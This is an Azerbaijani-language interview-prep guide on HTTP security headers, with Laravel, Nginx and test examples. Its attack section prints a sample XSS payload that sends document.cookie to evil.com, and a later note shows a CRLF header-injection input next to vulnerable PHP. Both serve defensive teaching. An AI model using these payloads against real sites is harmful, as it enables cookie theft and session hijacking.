# Security Headers (Senior ⭐⭐⭐)

## İcmal
Security headers — HTTP response-da göndərilən və brauzerin davranışını idarə edən xüsusi başlıqlardır. Bu başlıqlar XSS, clickjacking, MIME sniffing, mixed content, cross-origin data leakage kimi attack-lardan müdafiə edir. Interview-da bu mövzu Senior developer-ın "defense in depth" anlayışını, browser security model-ini nə dərəcədə başa düşdüyünü yoxlayır.

## Niyə Vacibdir
Security header-lar az xərclə böyük müdafiə qatı əlavə edir — çox zaman bir neçə sətir konfiqurasiya kifayətdir. Lakin səhv konfiqurasiya tətbiqi sındıra bilər (məs: çox sərt CSP policy). İnterviewerlər bu mövzunu yoxlayarkən developer-ın yalnız adları bilmədiyini, real deployment-da nə işlər çıxardığını görmək istəyir. OWASP, Google Security Team, Mozilla Observatory — hamısı bu başlıqları vacib hesab edir. Mozilla Observatory, SecurityHeaders.com saytları reytinq hesablayır.

## Əsas Anlayışlar

- **Content-Security-Policy (CSP)**: Hansı mənbələrdən script, style, image yüklənə biləcəyini məhdudlaşdırır. XSS hücumlarına qarşı ən güclü header. Yanlış konfiqurasiya əlavə zəiflik yaratmır, amma tətbiqi sındıra bilər.
- **CSP directives**: `default-src` (fallback), `script-src`, `style-src`, `img-src`, `connect-src` (fetch/XHR), `frame-src`, `font-src`, `object-src 'none'` (plugin-lər).
- **CSP `unsafe-inline`**: Bütün inline script-lərə izin verir — bu CSP-nin xeyrini demək olar sıfıra endirir. Heç vaxt production-da istifadə etmə.
- **CSP `nonce`**: Hər request üçün unikal kriptografik token — yalnız `nonce="xyz123"` atributu olan inline script-lər işlər. Digərləri blok olur.
- **CSP `strict-dynamic`**: Nonce ilə yüklənmiş script-in əlavə etdiyi dynamic script-lərə güvən — SPA-larda lazım ola bilər.
- **`Content-Security-Policy-Report-Only`**: CSP-ni enforce etmədən yalnız pozuntuları report edir — production-a tətbiq etmədən əvvəl test dövrü üçün ideal.
- **CSP `report-uri` / `report-to`**: Policy pozuntularını müəyyən endpoint-ə JSON formatında göndərir — monitoring üçün.
- **Strict-Transport-Security (HSTS)**: Brauzeri yalnız HTTPS istifadəsinə məcbur edir. `max-age=31536000` (1 il), `includeSubDomains`, `preload`. HSTS preload siyahısına düşmək geri dönüşü olmayan addımdır.
- **X-Frame-Options**: Saytın iframe içindən göstərilməsini məhdudlaşdırır — clickjacking-ə qarşı. `DENY` (heç bir frame), `SAMEORIGIN`. CSP `frame-ancestors` daha güclü alternativdir.
- **X-Content-Type-Options: nosniff**: Brauzer Content-Type-a uyğun olmayan MIME sniffing etməsin. `.jpg` faylını `text/html` kimi render etmə cəhdinə qarşı.
- **Referrer-Policy**: Keçid zamanı Referer header-da nə qədər məlumat getsin. `no-referrer` (heç nə), `strict-origin` (yalnız origin), `strict-origin-when-cross-origin` (tövsiyə olunan).
- **Permissions-Policy** (əvvəlki Feature-Policy): Kamera, mikrofon, geolocation, payment, autoplay kimi browser feature-ların istifadəsini məhdudlaşdırır.
- **Cross-Origin-Embedder-Policy (COEP)**: Cross-origin resursların `crossorigin` atributu olmadan yüklənməsini bloklayır — `require-corp`.
- **Cross-Origin-Opener-Policy (COOP)**: Browsing context group izolyasiyası — `same-origin`. Spectre attack-a qarşı `SharedArrayBuffer` üçün lazımdır.
- **Cross-Origin-Resource-Policy (CORP)**: Resursun başqa origin-dən `no-cors` fetch edilməsinin qarşısını alır — `same-origin`, `same-site`, `cross-origin`.
- **X-XSS-Protection: 0**: Köhnə brauzer XSS filter-i — deaktiv etmək tövsiyə edilir. Modern brauzerlərdə bu filter özü XSS zəifliyi yarada bilirdi.
- **Cache-Control for sensitive data**: `no-store, no-cache` — authentication page-lər, personal data response-ları brauzer cache-inə düşməsin.

## Praktik Baxış

**Interview-da necə yanaşmaq:**
Yalnız başlıqların adını sıralamaq orta cavabdır. Güclü cavab CSP-nin nonce-based yanaşmasını, HSTS `preload`-un nə demək olduğunu, X-Frame-Options ilə CSP `frame-ancestors`-ın fərqini, COEP+COOP+CORP üçlüsünün niyə birlikdə lazım olduğunu izah edir. Konkret Laravel middleware + Nginx konfiqurasiyası nümunəsi göstərmək xalı artırır.

**Hansı konkret nümunələr gətirmək:**
- "Biz production-da CSP-ni `report-only` rejimdə işə saldıq, bir həftə ərzində 3 third-party script problemi tapıldı"
- "HSTS `preload`-u əlavə etmədən əvvəl bütün subdomain-lərin HTTPS hazır olduğunu yoxladıq"
- "Nginx-də `add_header` direktivini `always` flag-i olmadan istifadə etmişdik — 4xx/5xx response-larda header gəlmirdi, düzəltdik"

**Follow-up suallar interviewerlər soruşur:**
- "CSP nonce-u hər request-də yenidən generate etmirsiniz, nə olar?" — Static nonce XSS-ə açıqdır
- "HSTS `preload`-dan geri dönmək istəsəniz nə lazımdır?" — hstspreload.org-a removal request, brauzer yeniləməsi, aylar
- "İframe-ə ehtiyacınız varsa clickjacking-dən necə qorunursunuz?" — `frame-ancestors 'self' https://trusted.com`
- "CSP `unsafe-eval` niyə lazımdır, alternativləri nələrdir?"
- "COEP, COOP, CORP niyə birlikdə lazımdır?"

**Red flags — pis cavab əlamətləri:**
- "Security header-lar firewall işidir, developer üçün deyil"
- CSP-ni yalnız `unsafe-inline` ilə konfiqurasiya etmək — demək olar ki, heç bir qoruması qalmır
- HSTS-i test etmədən production-a tətbiq etmək — subdomain HTTPS hazır deyilsə bütün subdomain bloklanır
- Bütün header-ları bilmək amma hansının niyə vacib olduğunu izah edə bilməmək

## Nümunələr

### Tipik Interview Sualı
"Yeni bir Laravel layihəsini production-a çıxarırsınız. Hansı security header-ları konfiqurasiya edərdiniz, niyə və necə?"

### Güclü Cavab
"Mən "defense in depth" yanaşması ilə minimum aşağıdakıları konfiqurasiya edərdim:

Birinci addım: `Strict-Transport-Security` — bütün trafikin HTTPS üzərindən getməsini təmin edir. `max-age=31536000; includeSubDomains` ilə başlayardım. Bütün subdomain-lər HTTPS-ə hazır olandan sonra `preload` əlavə edərdim — bu dönüşü olmayan addımdır, buna görə ehtiyatlı yanaşıram.

İkinci: `X-Frame-Options: SAMEORIGIN` — clickjacking hücumuna qarşı. Lakin CSP `frame-ancestors` daha güclüdür çünki daha fine-grained control verir.

Üçüncü: `X-Content-Type-Options: nosniff` — MIME sniffing attack-ına qarşı. Bir sətirlik konfiqurasiya.

Dördüncü: `Content-Security-Policy` üçün mən `report-only` rejimdən başlayardım. Bir-iki həftə report toplayıb, hansı third-party script-lər bloklanır görüb, sonra enforce edərdim. Inline script-lər üçün nonce-based yanaşma — hər request-də kriptografik random nonce generate edilir.

Beşinci: `Referrer-Policy: strict-origin-when-cross-origin` — xarici keçidlərdə path məlumatı getməsin.

Altıncı: `Permissions-Policy: camera=(), microphone=(), geolocation=()` — istifadə etmədiyimiz browser API-larını tamamilə söndür.

Laravel-də bunları Middleware-də idarə edirəm. Nginx-də `always` flag-i lazımdır — olmasa 4xx/5xx response-larda header gəlmir. Mozilla Observatory ilə audit edirəm, A+ hədəf."

### Konfiqurasiya / Kod Nümunəsi — Laravel Middleware

```php
// app/Http/Middleware/SecurityHeaders.php
namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Illuminate\Http\Response;

class SecurityHeaders
{
    public function handle(Request $request, Closure $next): Response
    {
        $response = $next($request);

        // Hər request üçün yeni nonce — static nonce XSS-ə açıqdır
        $nonce = base64_encode(random_bytes(16));
        $request->attributes->set('csp_nonce', $nonce);

        $csp = implode('; ', [
            "default-src 'self'",
            "script-src 'self' 'nonce-{$nonce}'",
            "style-src 'self' 'nonce-{$nonce}'",
            "img-src 'self' data: https:",
            "font-src 'self'",
            "connect-src 'self' https://api.stripe.com",
            "object-src 'none'",           // Plugin-lar söndürülür
            "base-uri 'self'",             // Base tag injection-a qarşı
            "frame-ancestors 'none'",      // Clickjacking-ə qarşı
            "form-action 'self'",          // Form submission yalnız self-ə
            "upgrade-insecure-requests",   // HTTP linkləri HTTPS-ə çevir
            "report-uri /csp-report",
        ]);

        $response->headers->set('Content-Security-Policy', $csp);
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), payment=()');
        $response->headers->set('X-XSS-Protection', '0'); // Köhnə filter söndürülür
        $response->headers->remove('X-Powered-By');       // PHP version gizlə
        $response->headers->remove('Server');             // Server info gizlə

        return $response;
    }
}

// Blade template-də nonce istifadəsi
// resources/views/layouts/app.blade.php
// <script nonce="{{ request()->attributes->get('csp_nonce') }}">
//     // Bu inline script işləyəcək
// </script>
```

### Konfiqurasiya — Nginx

```nginx
# /etc/nginx/conf.d/security-headers.conf
# ALWAYS flag — 4xx/5xx response-larda da header göndər

add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
add_header X-Frame-Options "DENY" always;
add_header X-Content-Type-Options "nosniff" always;
add_header Referrer-Policy "strict-origin-when-cross-origin" always;
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()" always;
add_header X-XSS-Protection "0" always;

# Server info gizlə
server_tokens off;
more_clear_headers 'X-Powered-By';
```

### Kod Nümunəsi — CSP Report Endpoint

```php
// routes/api.php
Route::post('/csp-report', function (Request $request): \Illuminate\Http\Response {
    $report = $request->json()->all();

    // Structured log — SIEM-ə göndər
    Log::channel('security')->warning('CSP Violation', [
        'document_uri'   => $report['csp-report']['document-uri'] ?? null,
        'violated_directive' => $report['csp-report']['violated-directive'] ?? null,
        'blocked_uri'    => $report['csp-report']['blocked-uri'] ?? null,
        'original_policy' => $report['csp-report']['original-policy'] ?? null,
        'ip'             => $request->ip(),
        'user_agent'     => $request->userAgent(),
    ]);

    return response()->noContent();
})->withoutMiddleware([\App\Http\Middleware\VerifyCsrfToken::class]);
```

### Attack Nümunəsi — CSP Olmadan XSS

```
Ssenari: Şərh bölməsini XSS ilə exploit etmək

1. CSP yoxdur, sanitization zəifdir
2. Attacker şərh yazır:
   <script>fetch('https://evil.com/steal?c='+document.cookie)</script>
3. Admin bu şərhi görür → cookie oğurlanır

CSP ilə:
Content-Security-Policy: script-src 'self' 'nonce-abc123'

Eyni attack:
<script>...</script> → Blok! nonce yoxdur
fetch('https://evil.com') → Blok! connect-src 'self'-dədir

CSP report-only rejimdə:
- Script bloklanmır, amma violation report gəlir
- Security team: "Kimin sahəsi XSS varmış, budur evidence"

Nonce yenilənməsə (static nonce):
- Attacker bir dəfə nonce-u görür: nonce="abc123"
- Inline script-ə nonce əlavə edir
- Bypass olur!
→ Buna görə hər request-də random nonce lazımdır
```

### İkinci Nümunə — HSTS Preload Tuzağı

```
Ssenari: HSTS preload əlavə etmədən əvvəl düşünülməli olanlar

1. Sayt: example.com
2. Subdomain: staging.example.com — hələ HTTPS yoxdur
3. Admin naively əlavə edir:
   Strict-Transport-Security: max-age=31536000; includeSubDomains; preload

4. Brauzer caches: "example.com və bütün subdomain-ləri yalnız HTTPS"
5. staging.example.com HTTPS yoxdur → Brauzer bloklar → Uğursuzluq

6. Preload siyahısından çıxmaq lazımdır:
   - hstspreload.org-a removal request göndər
   - Chrome, Firefox yeniləmələrini gözlə — aylar sürə bilər
   - Bu müddətdə həmin subdomain-lərə daxil olmaq mümkün deyil

Düzgün sıra:
1. Əvvəl bütün subdomain-ləri HTTPS-ə keçir
2. Test et: hər subdomain-i brauzerda açıb HTTPS işlədiyini doğrula
3. Sonra includeSubDomains əlavə et
4. Production-da bir müddət gözlə, problem yoxsa preload əlavə et
5. hstspreload.org-da qeydiyyatdan keç
```

## Praktik Tapşırıqlar

- Mozilla Observatory (observatory.mozilla.org) ilə öz saytını audit et — A+ almaq üçün nə lazımdır?
- CSP-ni `report-only` rejimdə aktiv et, 1 həftə sonra violation report-ları analiz et
- Nginx konfiqurasiyasında `always` flag-ini çıxar — 404 response-da header-ın gəlmədiyini gör
- `X-Frame-Options: DENY` əvəzinə CSP `frame-ancestors 'none'` istifadə et, fərqi yoxla
- Nonce-u static saxla (har dəfə eyni), XSS ilə bypass etməyə çalış — sonra hər request-də yenilə
- Bir subdomain-i HTTPS-siz qoyub `includeSubDomains` əlavə et — nə baş verdiyini gör
- Permissions-Policy ilə geolocation-ı söndür, JavaScript-dən istifadə etməyə çalış — brauzer xətasını gör

## Ətraflı Qeydlər

**Header injection attack**: User input-u response header-a qoymaq çox təhlükəlidir. `\r\n` (CRLF) sequence-i ilə attacker yeni header əlavə edə bilər:
```php
// ❌ Dangerous — user input birbaşa header-a
header('Location: ' . $_GET['url']); // CRLF injection!

// Input: /safe-page\r\nSet-Cookie: session=hacked
// Nəticə: brauzerdə session cookie dəyişdirilir

// ✅ Safe — whitelist ilə
$allowedUrls = ['/dashboard', '/profile', '/orders'];
$url = in_array($_GET['url'], $allowedUrls) ? $_GET['url'] : '/dashboard';
header('Location: ' . $url);
```

**Subresource Integrity (SRI)**: CDN-dən yüklənən script/style-ları integrity hash ilə yoxla:
```html
<script src="https://cdn.example.com/lib.js"
        integrity="sha384-abc123..."
        crossorigin="anonymous"></script>
```
Script dəyişdirilibsə brauzer yükləmir. CSP-ni tamamlayır.

**Security.txt**: RFC 9116 — saytın security contact məlumatları:
```
# /.well-known/security.txt
Contact: security@yourcompany.com
Expires: 2027-01-01T00:00:00.000Z
Preferred-Languages: az, en
```

**API response-larda security header**: JSON API endpoint-ləri də security header tələb edir. `X-Content-Type-Options: nosniff` JSON response-larda MIME sniffing-i önləyir. API endpoint-lərinde `X-Frame-Options` lazım deyil (frame yoxdur), amma `Strict-Transport-Security` mütləq lazımdır.

**Laravel Sanctum/Passport üçün əlavə**: SPA authentication-da CSP `connect-src` directive-inə API endpoint-i əlavə etmək lazımdır — `connect-src 'self' https://api.yourdomain.com`. Cookie-based auth üçün `SameSite=Strict` da security header-larla birlikdə işləyir.

**Staging vs Production fərqi**: Staging-də CSP `report-only` saxla. Production-da enforce et. HSTS-in `max-age`-i staging-də qısa saxla (`max-age=300`) — xəta edilsə tez düzəltmək mümkün olsun. Production-da uzun `max-age` (1 il) istifadə et.

**Header audit avtomatlaşdırma**: CI/CD pipeline-da header-ları test et:
```bash
# curl ilə header yoxlama
curl -I https://yoursite.com | grep -E "Strict-Transport|Content-Security|X-Frame|X-Content"

# Mozilla Observatory CLI
npx observatory yoursite.com --format json | jq '.grade'
```

**Laravel Pest/PHPUnit ilə header test**:
```php
// tests/Feature/SecurityHeadersTest.php
public function test_security_headers_present(): void
{
    $response = $this->get('/');

    $response->assertHeader('Strict-Transport-Security');
    $response->assertHeader('X-Content-Type-Options', 'nosniff');
    $response->assertHeader('X-Frame-Options', 'DENY');
    $response->assertHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

    // CSP varsa, unsafe-inline yoxdur
    $csp = $response->headers->get('Content-Security-Policy');
    $this->assertStringNotContainsString('unsafe-inline', $csp ?? '');
}

public function test_x_powered_by_header_removed(): void
{
    $response = $this->get('/');
    $response->assertHeaderMissing('X-Powered-By'); // PHP version gizlənib
}
```

**Cloudflare / CDN ilə**: CDN-dən keçən trafikdə header-ların düzgün gəlib-gəlmədiyini `curl` ilə birbaşa origin server-ə yoxlamaq lazımdır — CDN öz header-larını əlavə edə bilər, bəzən override edə bilər. Origin server-dəki Nginx konfiqurasiyasını da test etmək vacibdir.

## Əlaqəli Mövzular
- `03-xss-csrf.md` — CSP XSS-in qarşısını almaqda əsas rol oynayır
- `06-oauth2-flows.md` — OAuth2 redirect_uri validation ilə security header-lar tamamlayıcıdır
- `08-secrets-management.md` — Header-larda sensitive məlumat göndərməmək
- `09-input-validation.md` — Header injection attack-ları — user input-u response header-a qoymaq
- `15-threat-modeling.md` — Threat model-də browser-based attack-lar security header-larla əhatə olunur
